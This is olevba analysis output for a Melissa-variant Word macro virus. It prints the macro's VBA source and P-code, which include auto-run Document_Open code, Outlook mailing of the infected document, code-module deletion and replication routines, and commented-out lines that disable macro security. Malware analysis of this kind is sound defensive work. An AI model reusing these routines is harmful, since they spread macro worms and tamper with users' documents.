olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Melissa.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO MelissasLittleSister.cls 
in file: Virus.MSWord.Melissa.b - OLE stream: 'Macros/VBA/MelissasLittleSister'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
'If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
'CommandBars("Macro").Controls("Security...").Enabled = False
'System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
'Else
'CommandBars("Tools").Controls("Macro").Enabled = False
'Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
'End If
' This could have disabled your macro protection, but that code has been removed
Dim outlook1, outlook2, outlook3
Set outlook1 = CreateObject("Outlook.Application")
Set outlook2 = outlook1.GetNameSpace("MAPI")
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "MelissasLittleSister?") <> "... by Kwyjibo" Then
If outlook1 = "Outlook" Then
outlook2.Logon "profile", "password"
    For List = 1 To outlook2.AddressLists.Count
        Set AddyBook = outlook2.AddressLists(y)
        currentnum = 1
        Set outlook3 = outlook1.CreateItem(0)
        For counter1 = 1 To AddyBook.AddressEntries.Count
            Peep = Application.UserName
            outlook3.Recipients.Add Peep
            currentnum = currentnum + 1
            If currentnum > 1 Then counter1 = AddyBook.AddressEntries.Count
         Next counter1
         outlook3.Subject = "Trust No One"
         outlook3.Body = "Be careful what you open.  It could be a virus."
         outlook3.Attachments.Add ActiveDocument.FullName
         outlook3.Send
         Peep = ""
    Next List
outlook2.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "MelissasLittleSister?") = "... by DumbAss"
End If
Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)
Set NTI1 = NormalTemplate.VBProject.VBComponents.Item(1)
NTCL = NTI1.CodeModule.CountOfLines
ADCL = ADI1.CodeModule.CountOfLines
BGN = 2
If ADI1.Name <> "MelissasLittleSister" Then
If ADCL > 0 Then _
ADI1.CodeModule.DeleteLines 1, ADCL
Set ToInfect = ADI1
ADI1.Name = "MelissasLittleSister"
' We don't want to actually infect the PC, just warn them
'DoAD = True
End If
If NTI1.Name <> "MelissasLittleSister" Then
If NTCL > 0 Then _
NTI1.CodeModule.DeleteLines 1, NTCL
Set ToInfect = NTI1
NTI1.Name = "MelissasLittleSister"
' We don't want to actually infect the PC, just warn them
'DoNT = True
End If
If DoNT <> True And DoAD <> True Then GoTo CYA
If DoNT = True Then
Do While ADI1.CodeModule.Lines(1, 1) = ""
ADI1.CodeModule.DeleteLines 1
Loop
ToInfect.CodeModule.AddFromString ("Private Sub Document_Close()")
Do While ADI1.CodeModule.Lines(BGN, 1) <> ""
ToInfect.CodeModule.InsertLines BGN, ADI1.CodeModule.Lines(BGN, 1)
BGN = BGN + 1
Loop
End If
If DoAD = True Then
Do While NTI1.CodeModule.Lines(1, 1) = ""
NTI1.CodeModule.DeleteLines 1
Loop
ToInfect.CodeModule.AddFromString ("Private Sub Document_Open()")
Do While NTI1.CodeModule.Lines(BGN, 1) <> ""
ToInfect.CodeModule.InsertLines BGN, NTI1.CodeModule.Lines(BGN, 1)
BGN = BGN + 1
Loop
End If
CYA:
If NTCL <> 0 And ADCL = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
'WORD/MelissasLittleSister written by DumbAss
'Works in both Word 2000 and Word 97
'Worm? Macro Virus? Word 97 Virus? Word 2000 Virus? You Decide!
'Word -> Email | Word 97 <--> Word 2000 ... it's a new age!
Selection.TypeText "This could have had disasterous results.  Be more careful next tiem you open an e-mail.  Protect yourself!  Find out how at these web sites: "
Selection.TypeText " http://www.eos.ncsu.edu/eos/info/computer_ethics/www/abuse/wvt/worm/ "
Selection.TypeText " http://www.nipc.gov/nipc/w97melissa.htm "
Selection.TypeText " http://www.cert.org/advisories/CA-99-04-Melissa-Macro-Virus.html "
Selection.TypeText " http://www.microsoft.com/security/bulletins/ms99-002.asp "
Selection.TypeText " http://www.infoworld.com/cgi-bin/displayStory.pl?990326.wcvirus.htm "
Selection.TypeText "                  "
End Sub



-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Melissa.b
' ===============================================================================
' Module streams:
' Macros/VBA/MelissasLittleSister - 8136 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	QuoteRem 0x0000 0x0077 "If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then"
' Line #3:
' 	QuoteRem 0x0000 0x003C "CommandBars("Macro").Controls("Security...").Enabled = False"
' Line #4:
' 	QuoteRem 0x0000 0x006E "System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&"
' Line #5:
' 	QuoteRem 0x0000 0x0004 "Else"
' Line #6:
' 	QuoteRem 0x0000 0x0036 "CommandBars("Tools").Controls("Macro").Enabled = False"
' Line #7:
' 	QuoteRem 0x0000 0x006B "Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)"
' Line #8:
' 	QuoteRem 0x0000 0x0006 "End If"
' Line #9:
' 	QuoteRem 0x0000 0x004F " This could have disabled your macro protection, but that code has been removed"
' Line #10:
' 	Dim 
' 	VarDefn outlook1
' 	VarDefn outlook2
' 	VarDefn outlook3
' Line #11:
' 	SetStmt 
' 	LitStr 0x0013 "Outlook.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set outlook1 
' Line #12:
' 	SetStmt 
' 	LitStr 0x0004 "MAPI"
' 	Ld outlook1 
' 	ArgsMemLd GetNameSpace 0x0001 
' 	Set outlook2 
' Line #13:
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0015 "MelissasLittleSister?"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x000E "... by Kwyjibo"
' 	Ne 
' 	IfBlock 
' Line #14:
' 	Ld outlook1 
' 	LitStr 0x0007 "Outlook"
' 	Eq 
' 	IfBlock 
' Line #15:
' 	LitStr 0x0007 "profile"
' 	LitStr 0x0008 "password"
' 	Ld outlook2 
' 	ArgsMemCall Logon 0x0002 
' Line #16:
' 	StartForVariable 
' 	Ld List 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld outlook2 
' 	MemLd AddressLists 
' 	MemLd Count 
' 	For 
' Line #17:
' 	SetStmt 
' 	Ld y 
' 	Ld outlook2 
' 	ArgsMemLd AddressLists 0x0001 
' 	Set AddyBook 
' Line #18:
' 	LitDI2 0x0001 
' 	St currentnum 
' Line #19:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	Ld outlook1 
' 	ArgsMemLd CreateItem 0x0001 
' 	Set outlook3 
' Line #20:
' 	StartForVariable 
' 	Ld counter1 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld AddyBook 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	For 
' Line #21:
' 	Ld Application 
' 	MemLd UserName 
' 	St Peep 
' Line #22:
' 	Ld Peep 
' 	Ld outlook3 
' 	MemLd Recipients 
' 	ArgsMemCall Add 0x0001 
' Line #23:
' 	Ld currentnum 
' 	LitDI2 0x0001 
' 	Add 
' 	St currentnum 
' Line #24:
' 	Ld currentnum 
' 	LitDI2 0x0001 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld AddyBook 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	St counter1 
' 	EndIf 
' Line #25:
' 	StartForVariable 
' 	Ld counter1 
' 	EndForVariable 
' 	NextVar 
' Line #26:
' 	LitStr 0x000C "Trust No One"
' 	Ld outlook3 
' 	MemSt Subject 
' Line #27:
' 	LitStr 0x002F "Be careful what you open.  It could be a virus."
' 	Ld outlook3 
' 	MemSt Body 
' Line #28:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld outlook3 
' 	MemLd Attachments 
' 	ArgsMemCall Add 0x0001 
' Line #29:
' 	Ld outlook3 
' 	ArgsMemCall Send 0x0000 
' Line #30:
' 	LitStr 0x0000 ""
' 	St Peep 
' Line #31:
' 	StartForVariable 
' 	Ld List 
' 	EndForVariable 
' 	NextVar 
' Line #32:
' 	Ld outlook2 
' 	ArgsMemCall Logoff 0x0000 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	LitStr 0x000E "... by DumbAss"
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0015 "MelissasLittleSister?"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ADI1 
' Line #37:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NTI1 
' Line #38:
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St NTCL 
' Line #39:
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ADCL 
' Line #40:
' 	LitDI2 0x0002 
' 	St BGN 
' Line #41:
' 	Ld ADI1 
' 	MemLd New 
' 	LitStr 0x0014 "MelissasLittleSister"
' 	Ne 
' 	IfBlock 
' Line #42:
' 	LineCont 0x0004 05 00 00 00
' 	Ld ADCL 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld ADCL 
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #43:
' 	SetStmt 
' 	Ld ADI1 
' 	Set ToInfect 
' Line #44:
' 	LitStr 0x0014 "MelissasLittleSister"
' 	Ld ADI1 
' 	MemSt New 
' Line #45:
' 	QuoteRem 0x0000 0x0038 " We don't want to actually infect the PC, just warn them"
' Line #46:
' 	QuoteRem 0x0000 0x000B "DoAD = True"
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	Ld NTI1 
' 	MemLd New 
' 	LitStr 0x0014 "MelissasLittleSister"
' 	Ne 
' 	IfBlock 
' Line #49:
' 	LineCont 0x0004 05 00 00 00
' 	Ld NTCL 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld NTCL 
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #50:
' 	SetStmt 
' 	Ld NTI1 
' 	Set ToInfect 
' Line #51:
' 	LitStr 0x0014 "MelissasLittleSister"
' 	Ld NTI1 
' 	MemSt New 
' Line #52:
' 	QuoteRem 0x0000 0x0038 " We don't want to actually infect the PC, just warn them"
' Line #53:
' 	QuoteRem 0x0000 0x000B "DoNT = True"
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	Ld DoNT 
' 	LitVarSpecial (True)
' 	Ne 
' 	Ld DoAD 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo CYA 
' 	EndIf 
' Line #56:
' 	Ld DoNT 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #57:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	DoWhile 
' Line #58:
' 	LitDI2 0x0001 
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #59:
' 	Loop 
' Line #60:
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Paren 
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #61:
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #62:
' 	Ld BGN 
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #63:
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Add 
' 	St BGN 
' Line #64:
' 	Loop 
' Line #65:
' 	EndIfBlock 
' Line #66:
' 	Ld DoAD 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #67:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	DoWhile 
' Line #68:
' 	LitDI2 0x0001 
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #69:
' 	Loop 
' Line #70:
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Paren 
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #71:
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #72:
' 	Ld BGN 
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #73:
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Add 
' 	St BGN 
' Line #74:
' 	Loop 
' Line #75:
' 	EndIfBlock 
' Line #76:
' 	Label CYA 
' Line #77:
' 	Ld NTCL 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld ADCL 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #78:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #79:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Ne 
' 	Paren 
' 	ElseIfBlock 
' Line #80:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	BoS 0x0000 
' 	EndIfBlock 
' Line #81:
' 	QuoteRem 0x0000 0x002C "WORD/MelissasLittleSister written by DumbAss"
' Line #82:
' 	QuoteRem 0x0000 0x0023 "Works in both Word 2000 and Word 97"
' Line #83:
' 	QuoteRem 0x0000 0x003E "Worm? Macro Virus? Word 97 Virus? Word 2000 Virus? You Decide!"
' Line #84:
' 	QuoteRem 0x0000 0x003A "Word -> Email | Word 97 <--> Word 2000 ... it's a new age!"
' Line #85:
' 	LitStr 0x008D "This could have had disasterous results.  Be more careful next tiem you open an e-mail.  Protect yourself!  Find out how at these web sites: "
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #86:
' 	LitStr 0x0046 " http://www.eos.ncsu.edu/eos/info/computer_ethics/www/abuse/wvt/worm/ "
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #87:
' 	LitStr 0x0029 " http://www.nipc.gov/nipc/w97melissa.htm "
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #88:
' 	LitStr 0x0042 " http://www.cert.org/advisories/CA-99-04-Melissa-Macro-Virus.html "
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #89:
' 	LitStr 0x003A " http://www.microsoft.com/security/bulletins/ms99-002.asp "
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #90:
' 	LitStr 0x0045 " http://www.infoworld.com/cgi-bin/displayStory.pl?990326.wcvirus.htm "
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #91:
' 	LitStr 0x0012 "                  "
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #92:
' 	EndSub 
' Line #93:
' Line #94:
' Line #95:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|open                |May open a file                              |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.eos.ncsu.|URL                                          |
|          |edu/eos/info/compute|                                             |
|          |r_ethics/www/abuse/w|                                             |
|          |vt/worm/            |                                             |
|IOC       |http://www.nipc.gov/|URL                                          |
|          |nipc/w97melissa.htm |                                             |
|IOC       |http://www.cert.org/|URL                                          |
|          |advisories/CA-99-04-|                                             |
|          |Melissa-Macro-      |                                             |
|          |Virus.html          |                                             |
|IOC       |http://www.microsoft|URL                                          |
|          |.com/security/bullet|                                             |
|          |ins/ms99-002.asp    |                                             |
|IOC       |http://www.infoworld|URL                                          |
|          |.com/cgi-bin/display|                                             |
|          |Story.pl?990326.wcvi|                                             |
|          |rus.htm             |                                             |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

